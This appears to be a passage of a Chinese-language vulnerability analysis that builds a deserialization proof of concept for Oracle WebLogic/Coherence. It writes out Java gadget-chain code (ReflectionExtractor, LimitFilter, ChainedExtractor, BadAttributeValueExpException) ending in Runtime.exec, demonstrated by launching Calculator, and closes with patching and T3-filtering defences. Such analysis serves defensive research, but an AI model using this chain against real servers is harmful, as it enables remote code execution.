***POC构造***

**非循环构造**

ZDI 给出来的 gadget 如下图所示：

![](../Images/3dce3eecc73a51074dddc2dbbcd626cc.png)

从这条利用链中可以看到com/tangosol/util/extractor/ReflectionExtractor#extract存在反射调用，oTarget 对象可控，可由攻击者传入，这里还需要看看this.m\_aoParam这么来的。

![](../Images/3eec660bb6dce6519ac1a2bceafcbaa2.png)

this.m\_aoParam和this.m\_sMethod可以通过实例化 ReflectionExtractor 传入

![](../Images/91f0b9b0a59f40ee9a494813638c8ca2.png)

Method对象this.m\_methodPrev有关系，初始的this.m\_methodPrev为null，但是经过下面处理

this.m\_methodPrev = method = ClassHelper.findMethod(clz, this.getMethodName(), ClassHelper.getClassArray(this.m\_aoParam), false);

之后变成了java.lang.Runtime.exec其中 getMethodName 是从this.m\_sMethod从获取结果，这个上面说过了。  

   public String getMethodName() {        return this.m\_sMethod;  
   }

之后就是反射的正常逻辑了。  

![](../Images/80328ff65ed5146b64582a128408bc62.png)

所以这部分POC，可以很轻易的构造出来。

       Runtime runtime=Runtime.getRuntime();  
       ReflectionExtractor reflectionExtractor = new ReflectionExtractor("exec", new String\[\]{"open /System/Applications/Calculator.app"});  
       reflectionExtractor.extract(runtime);

在往上走，调用栈的类是

com/tangosol/util/filter/LimitFilter#toString

![](../Images/9a5dd9ae65004a12e15616103d69e105.png)

这里详细看看几个对象，先看看 extractor ，假设 extractor 这个是我们前面的 reflectionExtractor ，那么这里的extractor.extract自然等价于 reflectionExtractor.extract。

ValueExtractor extractor = (ValueExtractor)this.m\_comparator

this.m\_comparator可以通过 setComparator 赋值搞定。  

![](../Images/31a0c005771680e74d0c9e15e7b1e4e8.png)

再回头品一下最开始的达到RCE需要在reflectionExtractor.extract传入 runtime 对象，所以这里假设this.m\_oAnchorTop是 runtime ，自然就回到了我们最开始的地方。

reflectionExtractor.extract(runtime)  

而this.m\_oAnchorTop可以通过 setTopAnchor 搞定，这个 oAnchor 刚好是一个 Object 对象。

public void setTopAnchor(Object oAnchor) {  
       this.m\_oAnchorTop = oAnchor;  
   }  

所以POC很可以很简单搞定到这里。

Runtime runtime=Runtime.getRuntime();  
       ReflectionExtractor reflectionExtractor = new ReflectionExtractor("exec", new String\[\]{"open /System/Applications/Calculator.app"});  
       LimitFilter limitFilter = new LimitFilter();  
       limitFilter.setComparator(reflectionExtractor);  
       limitFilter.setTopAnchor(runtime);  
       limitFilter.toString();  

而最后调用栈的入口是BadAttributeValueExpException.readObject，分析过CommonsCollections5的小伙伴应该清楚，这个链的入口实际上是JDK自身的，也就是JDK1.8开始才有的，因此这个洞要利用，首先必须在JDK1.8以上。

![](../Images/30aef5af92ae398cadde44602eb4424e.png)

而Runtime.getRuntime().exec并没有继承 Serializable 接口，没办法做到序列化和反序列化，所以这里需要自定义一个类继承 Serializable 接口，然后执行命令。

Exec exec = new Exec();  
       ReflectionExtractor reflectionExtractor = new ReflectionExtractor("exec", new String\[\]{"open /System/Applications/Calculator.app"});  
       LimitFilter limitFilter = new LimitFilter();  
       limitFilter.setComparator(reflectionExtractor);  
       limitFilter.setTopAnchor(exec);  
       BadAttributeValueExpException poc = new BadAttributeValueExpException("l1nk3r");  
       Field valfield = poc.getClass().getDeclaredField("val");  
       valfield.setAccessible(true);  
       valfield.set(poc, limitFilter)  

ObjectInputStream.readObject()  
   BadAttributeValueExpException.readObject()  
       LimitFilter.toString()  
           ReflectionExtractor.extract()  
               Method.invoke()  
                   Runtime.exec()  

**循环链式构造**

这里实际上会发现，我们掠过了一个调用栈com/tangosol/util/extractor/ChainedExtractor#extract，看一看这个方法

public E extract(Object oTarget) {  
       ValueExtractor\[\] aExtractor = this.getExtractors();        int i = 0;        for(int c = aExtractor.length; i < c && oTarget != null; ++i) {  
           oTarget = aExtractor\[i\].extract(oTarget);  
       }        return oTarget;  
   }  

实际上就是从this.getExtractors()取出数组数据，然后交由下面进行循环，每次循环执行aExtractor\[i\].extract(oTarget)，而这一步我们知道会来到ReflectionExtractor#extract进行反射调用。this.getExtractors()可通过m\_aExtractor对象获取得到。

![](../Images/77d43bd5f1495f9f2c5d2e6a50bfd0d3.png)

而在chainedExtractor这个类中并没有m\_aExtractor这个属性的参数传入方式，因此这里需要回到他的父类，也就是AbstractCompositeExtractor进行参数的设置。

![](../Images/335895072e1ccb9ef63dc07250ba2eb4.png)

因此这部分POC的构造实际上很简单，如下所示：

ReflectionExtractor reflectionExtractor1 = new ReflectionExtractor("getMethod", new Object\[\] {"getRuntime", new Class\[\]{}});  
ReflectionExtractor reflectionExtractor2 = new ReflectionExtractor("invoke", new Object\[\]{null, new Object\[\]{}});  
ReflectionExtractor reflectionExtractor3 = new ReflectionExtractor("exec", new Object\[\]{new String\[\]{"open", "/System/Applications/Calculator.app"}});  
ValueExtractor\[\] valueExtractors = new ValueExtractor\[\] {  
               reflectionExtractor1,  
               reflectionExtractor2,  
               reflectionExtractor3,  
       };  
Class clazz = chainedExtractor.getClass().getSuperclass();  
Field m\_aExtractor = clazz.getDeclaredField("m\_aExtractor");  
m\_aExtractor.setAccessible(true);  
m\_aExtractor.set(chainedExtractor, valueExtractors);  

进入chainedExtractor#extract处理。

第一次循环：oTarget是java.lang.Runtime，method是getMethod，this.m\_aoParam是getRuntime，那么这里拼接起来就是

java.lang.Runtime.class.getMethod("getRuntime",new Class\[\]);  

![](../Images/f0520d26d8a5158d4ad8ee7b0e1522e8.png)

第二次循环：oTarget是java.lang.Runtime.getRuntime，method是invoke，this.m\_aoParam是null，那么这里执行完拼接起来就是

java.lang.Runtime.class.getMethod("getRuntime",new Class\[\]).invoke(null, new Object\[\])  

![](../Images/a7d886228ddf54242813cdd3ef521e9f.png)

第三次循环：此时的oTarget是实例化后的 Runtime 对象，method是exec，this.m\_aoParam是需要执行的命令，也就是说到这里这一步成功执行了我们想要的命令了。

java.lang.Runtime.getRuntime().exec("open /System/Applications/Calculator.app");  

![](../Images/506c284c1ed3199330170a6f9a568f50.png)

后面的构造实际上就和上面一样了，构造链：

           ChainedExtractor.extract()

                   Method.invoke()  
                       Class.getMethod()

***防御方案***

1.  升级补丁，参考oracle官网发布的补丁https://www.oracle.com/security-alerts/cpujan2020.html 如果不依赖T3协议进行JVM通信，禁用T3协议。
    
2.  进入WebLogic控制台，在base\_domain配置页面中，进入安全选项卡页面，点击筛选器，配置筛选器。在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，在连接筛选器规则框中输入 7001 deny t3 t3s 保存生效（需重启）
